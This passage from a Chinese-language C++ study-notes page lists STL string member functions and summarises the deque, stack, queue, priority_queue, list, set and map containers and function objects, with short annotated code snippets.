把字符串s的前n个字符连接到当前字符串结尾</span></span><br><span class="line"><span class="function">string&amp; <span class="title">append</span><span class="params">(<span class="type">const</span> string &amp;s)</span></span>; <span class="comment">// 同operator+=(const string&amp; str)</span></span><br><span class="line"><span class="function">string&amp; <span class="title">append</span><span class="params">(<span class="type">const</span> string &amp;sint pos,<span class="type">int</span> n)</span></span>; <span class="comment">// 字符串s中从pos开始的n个字符连接到字符串结尾</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 查找（const表示不修改字符串，没找到返回-1）</span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">find</span><span class="params">(<span class="type">const</span> string&amp; str, <span class="type">int</span> pos = <span class="number">0</span>)</span> <span class="type">const</span></span>; <span class="comment">// 查找str第一次出现位置,从pos开始查找</span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">find</span><span class="params">(<span class="type">const</span> <span class="type">char</span>* s,<span class="type">int</span> pos = <span class="number">0</span>)</span> <span class="type">const</span></span>; <span class="comment">// 查找s第一次出现位置,从pos开始查找</span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">find</span><span class="params">(<span class="type">const</span> <span class="type">char</span>* s,<span class="type">int</span> pos,<span class="type">int</span> n)</span> <span class="type">const</span></span>; <span class="comment">// 从pos位置查找s的前n个字符第一次位置</span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">find</span><span class="params">(<span class="type">const</span> <span class="type">char</span> c, <span class="type">int</span> pos = <span class="number">0</span>)</span> <span class="type">const</span></span>; <span class="comment">// 查找字符c第一次出现位置</span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">rfind</span><span class="params">(<span class="type">const</span> string&amp; str, <span class="type">int</span> pos = npos )</span> <span class="type">const</span></span>; <span class="comment">// 查找str最后一次位置,从pos开始查找</span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">rfind</span><span class="params">(<span class="type">const</span> <span class="type">char</span>* s,<span class="type">int</span> pos = npos )</span> <span class="type">const</span></span>; <span class="comment">// 查找s最后一次出现位置,从pos开始查找</span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">rfind</span><span class="params">( <span class="type">const</span> <span class="type">char</span>* s,<span class="type">int</span> pos,<span class="type">int</span> n)</span> <span class="type">const</span></span>; <span class="comment">// 从pos查找s的前n个字符最后一次位置</span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">rfind</span><span class="params">(<span class="type">const</span> <span class="type">char</span> c,<span class="type">int</span> pos = <span class="number">0</span>)</span> <span class="type">const</span></span>; <span class="comment">// 查找字符c最后一次出现位置</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 替换</span></span><br><span class="line"><span class="function">string&amp; <span class="title">replace</span><span class="params">(<span class="type">int</span> pos,<span class="type">int</span> n,<span class="type">const</span> string&amp; str)</span></span>; <span class="comment">// 替换从pos开始n个字符为字符串str</span></span><br><span class="line"><span class="function">string&amp; <span class="title">replace</span><span class="params">(<span class="type">int</span> pos,<span class="type">int</span> n,<span class="type">const</span> <span class="type">char</span>* s)</span></span>; <span class="comment">// 替换从pos开始的n个字符为字符串s</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 字符串比较（ASCII码，=返回0，&gt;返回1，&lt;返回-1）</span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">compare</span><span class="params">(<span class="type">const</span> string &amp;s)</span> <span class="type">const</span></span>;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">compare</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *s)</span> <span class="type">const</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 存取（可修改）</span></span><br><span class="line"><span class="type">char</span>&amp; <span class="keyword">operator</span>[](<span class="type">int</span> n); <span class="comment">// 直接索引</span></span><br><span class="line"><span class="function"><span class="type">char</span>&amp; <span class="title">at</span><span class="params">(<span class="type">int</span> n)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 插入</span></span><br><span class="line"><span class="function">string&amp; <span class="title">insert</span><span class="params">(<span class="type">int</span> pos,<span class="type">const</span> <span class="type">char</span>* s)</span></span>; <span class="comment">// 插入字符串</span></span><br><span class="line"><span class="function">string&amp; <span class="title">insert</span><span class="params">(<span class="type">int</span> pos,<span class="type">const</span> string&amp; str)</span></span>; <span class="comment">// 插入字符串</span></span><br><span class="line"><span class="function">string&amp; <span class="title">insert</span><span class="params">(<span class="type">int</span> pos,<span class="type">int</span> n, <span class="type">char</span> c)</span></span>; <span class="comment">// 在指定位置插入n个字符c</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 删除</span></span><br><span class="line"><span class="function">string&amp; <span class="title">erase</span><span class="params">(<span class="type">int</span> pos, <span class="type">int</span> n = npos)</span></span>;</span><br><span class="line"><span class="comment">//删除从Pos开始的n个字符</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 获得子串</span></span><br><span class="line"><span class="function">string <span class="title">substr</span><span class="params">(<span class="type">int</span> pos = <span class="number">0</span>,<span class="type">int</span> n = npos)</span> <span class="type">const</span></span>; <span class="comment">// 返回从pos开始的n个字符组成的字符串</span></span><br></pre></td></tr></table></figure><h3 id="5-deque容器"><a href="#5-deque容器" class="headerlink" title="5 deque容器"></a>5 deque容器</h3><blockquote><p>双端队列。</p><ul><li>vector对于头部的插入删除效率低，因为插入要移动元素。</li><li>deque相对而言，对头部的插入删除速度比vector快。</li><li>vector访问元素时的速度会比deque快，这和两者内部实现有关。</li></ul><p>内部工作原理：deque内部有个中控器，中控器中有多段缓冲区，缓冲区中存放数据。中控器维护每段缓冲区中的地址，使得deque使用时像一片连续的内存空间。</p><p>deque容器的迭代器是支持随机访问的迭代器。</p></blockquote><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;deque&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 创建双端队列（类似vector）</span></span><br><span class="line">deque&lt;T&gt; deqT;</span><br><span class="line"><span class="built_in">deque</span>(v.<span class="built_in">begin</span>(),v.<span class="built_in">end</span>());</span><br><span class="line"><span class="built_in">deque</span>(n,elem);</span><br><span class="line"><span class="built_in">deque</span>(<span class="type">const</span> deque &amp;deq);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 赋值（类似vector）</span></span><br><span class="line">deque&amp; <span class="keyword">operator</span> = (<span class="type">const</span> deque &amp;deq);</span><br><span class="line"><span class="built_in">assign</span>(beg,end);</span><br><span class="line"><span class="built_in">assign</span>(n,elem);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 大小（类似vector,但是没有capacity，因为它可以无限扩展）</span></span><br><span class="line"><span class="built_in">empty</span>();</span><br><span class="line"><span class="built_in">size</span>();</span><br><span class="line"><span class="built_in">resize</span>(<span class="type">int</span> num);</span><br><span class="line"><span class="built_in">resize</span>(<span class="type">int</span> num,elem);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 两端插入和删除</span></span><br><span class="line"><span class="built_in">push_back</span>(elem);</span><br><span class="line"><span class="built_in">push_front</span>(elem);</span><br><span class="line"><span class="built_in">pop_back</span>();</span><br><span class="line"><span class="built_in">pop_front</span>();</span><br><span class="line"></span><br><span class="line"><span class="comment">// 指定位置插入删除</span></span><br><span class="line"><span class="built_in">insert</span>(pos,elem);</span><br><span class="line"><span class="built_in">insert</span>(pos,n,elem);</span><br><span class="line"><span class="built_in">insert</span>(pos,beg,end);</span><br><span class="line"><span class="built_in">erase</span>(pos);</span><br><span class="line"><span class="built_in">erase</span>(beg,end);</span><br><span class="line"><span class="built_in">clear</span>();</span><br><span class="line"></span><br><span class="line"><span class="comment">// 存取</span></span><br><span class="line"><span class="built_in">at</span>(<span class="type">int</span> idx);</span><br><span class="line"><span class="keyword">operator</span>[];</span><br><span class="line"><span class="built_in">front</span>();</span><br><span class="line"><span class="built_in">back</span>();</span><br></pre></td></tr></table></figure><h3 id="6-stack容器"><a href="#6-stack容器" class="headerlink" title="6 stack容器"></a>6 stack容器</h3><blockquote><p>栈。</p></blockquote><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stack&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 创建栈</span></span><br><span class="line">stack&lt;T&gt; stk;</span><br><span class="line"><span class="built_in">stack</span>(<span class="type">const</span> stack &amp;stk);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 赋值</span></span><br><span class="line">stack&amp; <span class="keyword">operator</span>=(<span class="type">const</span> stack &amp;stk);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 大小</span></span><br><span class="line"><span class="built_in">empty</span>();</span><br><span class="line"><span class="built_in">size</span>();</span><br><span class="line"></span><br><span class="line"><span class="comment">// 入栈出栈</span></span><br><span class="line"><span class="built_in">push</span>(elem);</span><br><span class="line"><span class="built_in">pop</span>(); <span class="comment">// 出栈（返回值为空！）</span></span><br><span class="line"><span class="built_in">top</span>(); <span class="comment">// 返回栈顶元素（不出栈）</span></span><br></pre></td></tr></table></figure><h3 id="7-queue容器"><a href="#7-queue容器" class="headerlink" title="7 queue容器"></a>7 queue容器</h3><blockquote><p>队列。</p></blockquote><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;queue&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 创建队列</span></span><br><span class="line">queue&lt;T&gt; que;</span><br><span class="line"><span class="built_in">queue</span>(<span class="type">const</span> queue &amp;que);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 赋值</span></span><br><span class="line">queue&amp; <span class="keyword">operator</span>=(<span class="type">const</span> queue &amp;que);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 大小</span></span><br><span class="line"><span class="built_in">empty</span>();</span><br><span class="line"><span class="built_in">size</span>();</span><br><span class="line"></span><br><span class="line"><span class="comment">// 入队出队</span></span><br><span class="line"><span class="built_in">push</span>(elem);</span><br><span class="line"><span class="built_in">pop</span>();</span><br><span class="line"><span class="built_in">front</span>(); <span class="comment">// 返回队头元素（不出队）</span></span><br><span class="line"><span class="built_in">back</span>(); <span class="comment">// 返回队尾元素（不出队）</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// 大小</span></span><br><span class="line"><span class="built_in">empty</span>();</span><br><span class="line"><span class="built_in">size</span>();</span><br><span class="line"><span class="built_in">resize</span>(<span class="type">int</span> num);</span><br><span class="line"><span class="built_in">resize</span>(<span class="type">int</span> num,elem);</span><br></pre></td></tr></table></figure><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 优先队列（默认大根堆）</span></span><br><span class="line">priority_queue&lt;T&gt; maxHeap;</span><br><span class="line">priority_queue&lt;T, vector&lt;T&gt;, less&lt;T&gt;&gt; maxHeap;</span><br><span class="line">priority_queue&lt;T, vector&lt;T&gt;, greater&lt;T&gt;&gt; minHeap; <span class="comment">// 切换到小根堆</span></span><br><span class="line"></span><br><span class="line">maxHeap.<span class="built_in">size</span>();</span><br><span class="line">maxHeap.<span class="built_in">empty</span>();</span><br><span class="line">maxHeap.<span class="built_in">push</span>(val);</span><br><span class="line">maxHeap.<span class="built_in">pop</span>();</span><br><span class="line">maxHeap.<span class="built_in">top</span>();</span><br></pre></td></tr></table></figure><h3 id="8-list容器"><a href="#8-list容器" class="headerlink" title="8 list容器"></a>8 list容器</h3><blockquote><p>双向循环链表。</p><p>list的优点：</p><ul><li>采用动态存储分配，不会造成内存浪费和溢出。</li><li>链表增删时间为O(1)。</li></ul><p>list的缺点：</p><ul><li>空间（额外的指针指向下一节点）和时间（遍历）消费大。</li></ul><p>List有一个重要的性质，插入操作和删除操作都不会造成原有list迭代器的失效，这在vector是不成立的。</p><p>list容器的迭代器是双向迭代器。</p></blockquote><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;list&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 创建双向循环链表</span></span><br><span class="line">list&lt;T&gt; lst;</span><br><span class="line"><span class="built_in">list</span>(beg,end);</span><br><span class="line"><span class="built_in">list</span>(n,elem);</span><br><span class="line"><span class="built_in">list</span>(<span class="type">const</span> list &amp;lst);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 赋值</span></span><br><span class="line">list&amp; <span class="keyword">operator</span> = (<span class="type">const</span> list &amp;list);</span><br><span class="line"><span class="built_in">assign</span>(beg,end);</span><br><span class="line"><span class="built_in">assign</span>(n,elem);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 两端插入和删除</span></span><br><span class="line"><span class="built_in">push_back</span>(elem);</span><br><span class="line"><span class="built_in">push_front</span>(elem);</span><br><span class="line"><span class="built_in">pop_back</span>();</span><br><span class="line"><span class="built_in">pop_front</span>();</span><br><span class="line"></span><br><span class="line"><span class="comment">// 指定位置插入删除</span></span><br><span class="line"><span class="built_in">insert</span>(pos,elem);</span><br><span class="line"><span class="built_in">insert</span>(pos,n,elem);</span><br><span class="line"><span class="built_in">insert</span>(pos,beg,end);</span><br><span class="line"><span class="built_in">erase</span>(pos);</span><br><span class="line"><span class="built_in">erase</span>(beg,end);</span><br><span class="line"><span class="built_in">clear</span>();</span><br><span class="line"><span class="built_in">remove</span>(elem); <span class="comment">// 删除所有与elem值匹配的元素</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 存取</span></span><br><span class="line"><span class="built_in">front</span>();</span><br><span class="line"><span class="built_in">back</span>();</span><br><span class="line"></span><br><span class="line"><span class="built_in">reverse</span>(); <span class="comment">// 反转</span></span><br><span class="line"><span class="built_in">sort</span>([func]); <span class="comment">// 排序（定义函数：bool func(a,b)&#123; return;&#125;）</span></span><br><span class="line"><span class="built_in">swap</span>(lst); <span class="comment">// 两个容器元素互换</span></span><br></pre></td></tr></table></figure><h3 id="9-set-multiset容器"><a href="#9-set-multiset容器" class="headerlink" title="9 set/multiset容器"></a>9 set/multiset容器</h3><blockquote><p>集合。</p><p>所有元素在插入时自动排序。</p><p>本质：关联式容器，底层是二叉树。</p><p>set不允许有重复元素，multiset允许有重复元素。</p></blockquote><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;set&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 创建集合</span></span><br><span class="line">set&lt;T&gt; st;</span><br><span class="line"><span class="built_in">set</span>(<span class="type">const</span> set &amp;st);</span><br><span class="line"><span class="comment">// 可重复集合</span></span><br><span class="line">multiset&lt;T&gt; st;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// 赋值</span></span><br><span class="line">set&amp; <span class="keyword">operator</span>=(<span class="type">const</span> set &amp;st);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 大小</span></span><br><span class="line"><span class="built_in">empty</span>();</span><br><span class="line"><span class="built_in">size</span>();</span><br><span class="line"></span><br><span class="line"><span class="comment">// 指定位置插入删除</span></span><br><span class="line"><span class="built_in">insert</span>(elem);</span><br><span class="line"><span class="built_in">erase</span>(pos);</span><br><span class="line"><span class="built_in">erase</span>(beg,end);</span><br><span class="line"><span class="built_in">erase</span>(elem); <span class="comment">// 删除值为elem的元素</span></span><br><span class="line"><span class="built_in">clear</span>();</span><br><span class="line"></span><br><span class="line"><span class="comment">// 查找</span></span><br><span class="line"><span class="built_in">find</span>(key); <span class="comment">// 查找key是否存在，存在返回指定元素的迭代器，不存在返回set.end();</span></span><br><span class="line"><span class="built_in">count</span>(key); <span class="comment">// 统计key的个数</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">swap</span>(st);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// 创建重复集合</span></span><br><span class="line">multiset&lt;T&gt; st;</span><br><span class="line"><span class="built_in">multiset</span>(<span class="type">const</span> set &amp;st);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 创建对组</span></span><br><span class="line"><span class="function">pair&lt;type,type&gt; <span class="title">p</span> <span class="params">(val_1,val_2)</span></span>;</span><br><span class="line">pair&lt;type,type&gt; p = <span class="built_in">make_pair</span>(val_1,val_2);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 取队组数</span></span><br><span class="line">p.first;</span><br><span class="line">p.second;</span><br></pre></td></tr></table></figure><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">// set的insert有返回结果判断是否插入成功</span></span><br><span class="line">pair&lt;set&lt;<span class="type">int</span>&gt;::iterator,<span class="type">bool</span>&gt; ret = s.<span class="built_in">insert</span>(<span class="number">10</span>);</span><br><span class="line"><span class="keyword">if</span>(ret.second) &#123; cout &lt;&lt; <span class="string">&quot;success!&quot;</span> &lt;&lt; endl;&#125;</span><br><span class="line"><span class="keyword">else</span> &#123; cout &lt;&lt; <span class="string">&quot;failed!&quot;</span> &lt;&lt; endl;&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// set排序（默认从小到大，可以自定义仿函数改变排序规则，需要在插入数据前改变）</span></span><br><span class="line"><span class="comment">// 从大到小排序</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">MyCompare</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">bool</span> <span class="title">operator</span><span class="params">()</span><span class="params">(<span class="type">int</span> v1,<span class="type">int</span> v2)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> v1 &gt; v2;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123; set&lt;<span class="type">int</span>,MyCompare&gt; s; &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 自定义数据类型需要指定排序规则规则</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;set&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Person</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">string m_Name;</span><br><span class="line"><span class="type">int</span> m_Age;</span><br><span class="line"><span class="built_in">Person</span>(string name, <span class="type">int</span> age)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">this</span>-&gt;m_Name = name;</span><br><span class="line"><span class="keyword">this</span>-&gt;m_Age = age;</span><br><span class="line">&#125;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">comparePerson</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="comment">// 函数尾需要加const进行只读限制</span></span><br><span class="line"><span class="function"><span class="type">bool</span> <span class="title">operator</span><span class="params">()</span><span class="params">(<span class="type">const</span> Person&amp; v1, <span class="type">const</span> Person&amp; v2)</span><span class="type">const</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">return</span> v1.m_Age &gt; v2.m_Age;</span><br><span class="line">&#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">set&lt;Person, comparePerson&gt; s;</span><br><span class="line"></span><br><span class="line">s.<span class="built_in">insert</span>(<span class="built_in">Person</span>(<span class="string">&quot;lili&quot;</span>, <span class="number">16</span>));</span><br><span class="line">s.<span class="built_in">insert</span>(<span class="built_in">Person</span>(<span class="string">&quot;muge&quot;</span>, <span class="number">12</span>));</span><br><span class="line">s.<span class="built_in">insert</span>(<span class="built_in">Person</span>(<span class="string">&quot;sora&quot;</span>, <span class="number">15</span>));</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (set&lt;Person, comparePerson&gt;::iterator it = s.<span class="built_in">begin</span>(); it != s.<span class="built_in">end</span>(); it++)</span><br><span class="line">&#123;</span><br><span class="line">cout &lt;&lt; (*it).m_Name &lt;&lt; <span class="string">&quot; is &quot;</span> &lt;&lt; (*it).m_Age &lt;&lt; endl;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="10-map-multimap容器"><a href="#10-map-multimap容器" class="headerlink" title="10 map/multimap容器"></a>10 map/multimap容器</h3><blockquote><p>字典。</p><p>元素都是pair，第一个是key，第二个是value。</p><p>所有元素都会根据元素的键值自动排序。</p><p>本质：关联式容器，底层是二叉树。</p><p>map不允许有重复的键，multimap允许有重复的键。</p><p>自定义数据类型需要指定排序规则规则（同理set）</p></blockquote><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;map&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 创建字典</span></span><br><span class="line">map&lt;T1,T2&gt; mp;</span><br><span class="line"><span class="built_in">map</span>(<span class="type">const</span> map &amp;mp);</span><br><span class="line"><span class="comment">// 无序字典</span></span><br><span class="line">unordered_map&lt;T1,T2&gt; mp;</span><br><span class="line"><span class="comment">// 可重复字典</span></span><br><span class="line">multimap&lt;T1,T2&gt; mp;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// 赋值</span></span><br><span class="line">map&amp; <span class="keyword">operator</span>=(<span class="type">const</span> map &amp;mp);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 大小</span></span><br><span class="line"><span class="built_in">empty</span>();</span><br><span class="line"><span class="built_in">size</span>();</span><br><span class="line"></span><br><span class="line"><span class="comment">// 指定位置插入删除</span></span><br><span class="line"><span class="built_in">insert</span>(pair&lt;key,value&gt;);</span><br><span class="line"><span class="built_in">erase</span>(pos);</span><br><span class="line"><span class="built_in">erase</span>(beg,end);</span><br><span class="line"><span class="built_in">erase</span>(key); <span class="comment">// 删除键为key的元素</span></span><br><span class="line"><span class="built_in">clear</span>();</span><br><span class="line"></span><br><span class="line"><span class="comment">// 查找</span></span><br><span class="line"><span class="built_in">find</span>(key); <span class="comment">// 查找key是否存在，存在返回指定元素的迭代器，不存在返回set.end();</span></span><br><span class="line"><span class="built_in">count</span>(key); <span class="comment">// 统计key的个数</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">swap</span>(mp);</span><br></pre></td></tr></table></figure><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">// map排序（默认从小到大，可以自定义仿函数改变排序规则，需要在插入数据前改变）</span></span><br><span class="line"><span class="comment">// 从大到小排序</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">MyCompare</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">bool</span> <span class="title">operator</span><span class="params">()</span><span class="params">(<span class="type">int</span> v1,<span class="type">int</span> v2)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> v1 &gt; v2;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123; map&lt;<span class="type">int</span>,<span class="type">int</span>,MyCompare&gt; mp; &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 初始化值为0，可以直接++</span></span><br><span class="line">map&lt;<span class="type">int</span>,<span class="type">int</span>&gt; mp;</span><br><span class="line">mp[i]++;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 遍历字典</span></span><br><span class="line"><span class="keyword">for</span>(map&lt;<span class="type">int</span>,<span class="type">int</span>&gt;::iterator iter = mp.<span class="built_in">begin</span>(); iter != mp.<span class="built_in">end</span>(); iter++)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> key = iter-&gt;first;</span><br><span class="line">    <span class="type">int</span> second = iter-&gt;second;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 判断键存在</span></span><br><span class="line"><span class="keyword">if</span>(mp.<span class="built_in">find</span>(s[i]) != mp.<span class="built_in">end</span>())&#123;;&#125;</span><br></pre></td></tr></table></figure><h3 id="11-函数对象"><a href="#11-函数对象" class="headerlink" title="11 函数对象"></a>11 函数对象</h3><blockquote><p>概念：</p><ul><li>重载函数调用操作符的类，其对象常称为函数对。</li><li>函数对象使用重载的()时，行为类似函数调用。也叫仿函数。</li></ul><p>本质:</p><ul><li>函数对象(仿函数)是一个类，不是一个函数。</li></ul><p>特点：</p><ol><li>函数对象在使用时，可以像普通函数那样调用，可以有参数，可以有返回值函数。</li><li>对象超出普通函数的概念，函数对象可以有自己的状态。</li><li>函数对象可以作为参数传递。</li></ol><p>谓词概念：</p><ul><li>返回bool类型的仿函数称为谓词。</li><li>如果operator()接受一个参数，那么叫一元谓词。</li><li>如果operator()接受两个参数，那么叫二元谓词。</li></ul></blockquote><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 1.函数对象在使用时，可以像普通函数那样调用，可以有参数，可以有返回值函数。</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">MyAdd</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">operator</span><span class="params">()</span><span class="params">(<span class="type">int</span> v1,<span class="type">int</span> v2)</span></span></span><br><span class="line"><span class="function">    </span>&#123; <span class="keyword">return</span> v1 + v2; &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">test01</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    MyAdd myAdd;</span><br><span class="line">    cout &lt;&lt; <span class="built_in">myAdd</span>(<span class="number">10</span>,<span class="number">10</span>) &lt;&lt; endl;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 2.对象超出普通函数的概念，函数对象可以有自己的状态。</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">MyPrint</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line"><span class="type">int</span> count = <span class="number">0</span>; <span class="comment">// 记录函数被调用的次数</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">operator</span><span class="params">()</span><span class="params">(string test)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">cout &lt;&lt; test &lt;&lt; endl;</span><br><span class="line">count++;</span><br><span class="line">&#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">test02</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">MyPrint myPrint;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">10</span>; i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">myPrint</span>(<span class="string">&quot;Hello World!&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">cout &lt;&lt; <span class="string">&quot;myPrint has been called &quot;</span> &lt;&lt; myPrint.count &lt;&lt; <span class="string">&quot; times&quot;</span> &lt;&lt; endl;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 3.函数对象可以作为参数传递。</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">doPrint</span><span class="params">(MyPrint &amp;mp, string test)</span></span></span><br><span class="line"><span class="function"></span>&#123; <span class="built_in">mp</span>(test); &#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">test03</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    MyPrint myPrint;</span><br><span class="line">    <span class="built_in">doPrint</span>(myPrint,<span class="string">&quot;Hello C++&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">// STL内建仿函数</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;functional&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 算术仿函数</span></span><br><span class="line"><span class="keyword">template</span>&lt;<span class="keyword">class</span> <span class="title class_">T</span>&gt; T plus&lt;T&gt; <span class="comment">// 加法仿函数</span></span><br><span class="line"><span class="keyword">template</span>&lt;<span class="keyword">class</span> <span class="title class_">T</span>&gt; T minus&lt;T&gt; <span class="comment">// 减法仿函数</span></span><br><span class="line"><span class="keyword">template</span>&lt;<span class="keyword">class</span> <span class="title class_">T</span>&gt; T multiplies&lt;T&gt; <span class="comment">// 乘法仿函数</span></span><br><span class="line"><span class="keyword">template</span>&lt;<span class="keyword">class</span> <span class="title class_">T</span>&gt; T divides&lt;T&gt; <span class="comment">// 除法仿函数</span></span><br><span class="line"><span class="keyword">template</span>&lt;<span class="keyword">class</span> <span class="title class_">T</span>&gt; T modulus&lt;T&gt; <span class="comment">// 取模仿函数</span></span><br><span class="line"><span class="keyword">template</span>&lt;<span class="keyword">class</span> <span class="title class_">T</span>&gt; T negate&lt;T&gt; <span class="comment">// 取反仿函数</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 关系仿函数</span></span><br><span class="line"><span class="keyword">template</span>&lt;<span class="keyword">class</span> <span 